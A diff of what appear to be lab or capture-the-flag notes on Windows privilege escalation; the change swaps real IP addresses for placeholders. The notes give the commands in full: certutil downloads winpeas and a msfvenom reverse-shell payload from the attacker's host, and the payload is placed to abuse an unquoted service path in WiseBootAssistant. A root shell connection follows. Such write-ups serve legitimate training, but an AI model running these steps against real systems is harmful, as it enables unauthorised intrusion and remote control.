@@ -9,21 +9,21 @@ for port 8080:
 		
 	using winpeas but first we have to download it to the kali and then get it from windows vm 
 		so using transfer folder and opening http server on port 80 -> $ sudo python3 -m http.server 80
-		then on win vm -> $ certutil.exe -urlcache -f http://192.168.50.228/winpeas.exe winpeas.exe
+		then on win vm -> $ certutil.exe -urlcache -f http://<HACKER IP>/winpeas.exe winpeas.exe
 		
 		
 		FOUND WiseBootAssistant ==>> No quotes and Space detected
-		$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.50.228 LPORT=7777 -f exe -o Wise.exe
+		$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<HACKER IP> LPORT=7777 -f exe -o Wise.exe
 		$ nc -nvlp 7777
 		
-		in vm 	$ certutil.exe -urlcache -f http://192.168.50.228/Wise.exe Wise.exe in Program Files (x86)/Wise folder 
+		in vm 	$ certutil.exe -urlcache -f http://<HACKER IP>/Wise.exe Wise.exe in Program Files (x86)/Wise folder 
 			$ sc stop WiseBootAssistant
 			$ sc start WiseBootAssistant
 			
 			
 		AND THATS IT!!! ROOTED
 		
-		connect to [192.168.50.228] from (UNKNOWN) [192.168.50.69] 49705
+		connect to [<HACKER IP>] from (UNKNOWN) [<VICTIM IP>] 49705
 		Microsoft Windows [Version 10.0.19043.928]
 		(c) Microsoft Corporation. All rights reserved.
 
